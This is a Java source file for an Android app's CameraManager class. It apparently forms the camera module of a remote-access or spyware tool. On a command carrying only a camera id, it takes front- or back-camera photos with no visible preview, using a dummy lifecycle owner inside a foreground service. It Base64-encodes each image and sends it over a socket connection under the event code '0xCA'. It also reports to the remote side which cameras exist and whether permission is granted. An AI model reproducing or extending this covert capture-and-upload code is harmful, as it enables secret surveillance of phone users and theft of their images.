package com.fason.app.features.camera;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Base64;

import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;
import com.google.common.util.concurrent.ListenableFuture;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraManager {

    private final Context context;
    private final Executor mainExecutor;
    private final ExecutorService cameraExecutor;
    private final ExecutorService sendExecutor;
    private ProcessCameraProvider cameraProvider;
    private ImageCapture imageCapture;
    private final AtomicBoolean isInitialized = new AtomicBoolean(false);
    private final AtomicBoolean isCapturing = new AtomicBoolean(false);
    private final CountDownLatch initLatch = new CountDownLatch(1);

    public CameraManager(Context ctx) {
        this.context = ctx.getApplicationContext();
        this.mainExecutor = ContextCompat.getMainExecutor(context);
        this.cameraExecutor = Executors.newSingleThreadExecutor();
        this.sendExecutor = Executors.newSingleThreadExecutor();
        init();
    }

    private void init() {
        cameraExecutor.execute(() -> {
            try {
                ListenableFuture<ProcessCameraProvider> future =
                    ProcessCameraProvider.getInstance(context);

                future.addListener(() -> {
                    try {
                        cameraProvider = future.get();
                        imageCapture = new ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(80)
                            .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                            .build();
                        isInitialized.set(true);
                        initLatch.countDown();
                    } catch (Exception e) {
                        initLatch.countDown();
                    }
                }, mainExecutor);

                // Wait for initialization with timeout
                initLatch.await(5, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
        });
    }

    /**
     * Ensure camera is ready, reinitialize if needed
     */
    private boolean ensureInitialized() {
        if (isInitialized.get() && cameraProvider != null) {
            return true;
        }

        // Reinitialize
        isInitialized.set(false);
        CountDownLatch latch = new CountDownLatch(1);

        cameraExecutor.execute(() -> {
            try {
                ListenableFuture<ProcessCameraProvider> future =
                    ProcessCameraProvider.getInstance(context);

                future.addListener(() -> {
                    try {
                        cameraProvider = future.get();
                        imageCapture = new ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(80)
                            .build();
                        isInitialized.set(true);
                    } catch (Exception ignored) {}
                    latch.countDown();
                }, mainExecutor);
            } catch (Exception e) {
                latch.countDown();
            }
        });

        try {
            latch.await(3, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}

        return isInitialized.get() && cameraProvider != null;
    }

    /**
     * Check camera permission
     */
    private boolean hasCameraPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }

    public void startUp(int camId) {
        // Check permission first
        if (!hasCameraPermission()) {
            sendError(camId, "Camera permission not granted");
            return;
        }

        // Prevent concurrent captures
        if (isCapturing.getAndSet(true)) {
            return;
        }

        // Update foreground service type for camera
        MainService service = MainService.getInstance();
        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }

        cameraExecutor.execute(() -> {
            try {
                if (!ensureInitialized()) {
                    sendError(camId, "Camera initialization failed");
                    isCapturing.set(false);
                    return;
                }
                captureInternal(camId);
            } catch (Exception e) {
                sendError(camId, "Capture failed: " + e.getMessage());
                isCapturing.set(false);
            }
        });
    }

    private void captureInternal(int camId) {
        if (cameraProvider == null || imageCapture == null) {
            sendError(camId, "Camera not initialized");
            isCapturing.set(false);
            return;
        }

        boolean frontCamera = camId == 1;
        CameraSelector selector = frontCamera
            ? CameraSelector.DEFAULT_FRONT_CAMERA
            : CameraSelector.DEFAULT_BACK_CAMERA;

        // Verify camera exists
        try {
            selector.filter(cameraProvider.getAvailableCameraInfos());
        } catch (Exception e) {
            sendError(camId, frontCamera ? "Front camera not available" : "Back camera not available");
            isCapturing.set(false);
            return;
        }

        mainExecutor.execute(() -> {
            try {
                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(
                    DummyLifecycleOwner.get(),
                    selector,
                    imageCapture
                );

                // Small delay to let camera settle
                cameraExecutor.execute(() -> {
                    try {
                        Thread.sleep(200);
                        mainExecutor.execute(() -> takePicture(camId));
                    } catch (Exception e) {
                        isCapturing.set(false);
                    }
                });
            } catch (Exception e) {
                sendError(camId, "Camera bind failed: " + e.getMessage());
                isCapturing.set(false);
            }
        });
    }

    private void takePicture(int camId) {
        if (imageCapture == null) {
            sendError(camId, "ImageCapture not ready");
            isCapturing.set(false);
            return;
        }

        imageCapture.takePicture(mainExecutor, new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(ImageProxy image) {
                sendExecutor.execute(() -> {
                    try {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        send(bytes, camId);
                    } catch (Exception e) {
                        sendError(camId, "Image processing failed");
                    } finally {
                        // Close on main thread
                        mainExecutor.execute(() -> {
                            image.close();
                            isCapturing.set(false);
                        });
                    }

                    // Release foreground service type for camera
                    MainService service = MainService.getInstance();
                    if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        service.releaseForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
                    }
                });
            }

            @Override
            public void onError(ImageCaptureException exception) {
                sendError(camId, "Capture error: " + exception.getMessage());
                isCapturing.set(false);

                // Reinitialize on error
                isInitialized.set(false);
                cameraExecutor.execute(CameraManager.this::init);
            }
        });
    }

    private void send(byte[] data, int camId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("image", true);
            obj.put("cameraId", camId);
            obj.put("buffer", Base64.encodeToString(data, Base64.NO_WRAP));
            obj.put("size", data.length);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xCA", obj);
        } catch (Exception ignored) {}
    }

    private void sendError(int camId, String error) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("image", false);
            obj.put("cameraId", camId);
            obj.put("error", error);
            obj.put("timestamp", System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit("0xCA", obj);
        } catch (Exception ignored) {}
    }

    public JSONObject findCameraList() {
        try {
            JSONArray list = new JSONArray();

            if (cameraProvider != null) {
                // Check if front camera exists
                try {
                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(cameraProvider.getAvailableCameraInfos());
                    JSONObject front = new JSONObject();
                    front.put("id", 1);
                    front.put("name", "Front");
                    list.put(front);
                } catch (Exception ignored) {}

                // Check if back camera exists
                try {
                    CameraSelector.DEFAULT_BACK_CAMERA.filter(cameraProvider.getAvailableCameraInfos());
                    JSONObject back = new JSONObject();
                    back.put("id", 0);
                    back.put("name", "Back");
                    list.put(back);
                } catch (Exception ignored) {}
            }

            // Fallback: always return both cameras if list is empty
            if (list.length() == 0) {
                JSONObject back = new JSONObject();
                back.put("id", 0);
                back.put("name", "Back");
                list.put(back);

                JSONObject front = new JSONObject();
                front.put("id", 1);
                front.put("name", "Front");
                list.put(front);
            }

            JSONObject result = new JSONObject();
            result.put("camList", true);
            result.put("list", list);
            result.put("hasPermission", hasCameraPermission());
            return result;
        } catch (Exception e) {
            try {
                JSONObject result = new JSONObject();
                result.put("camList", true);
                result.put("list", new JSONArray());
                result.put("error", e.getMessage());
                return result;
            } catch (Exception ignored) {}
            return null;
        }
    }

    public void shutdown() {
        cameraExecutor.shutdown();
        sendExecutor.shutdown();
    }
}
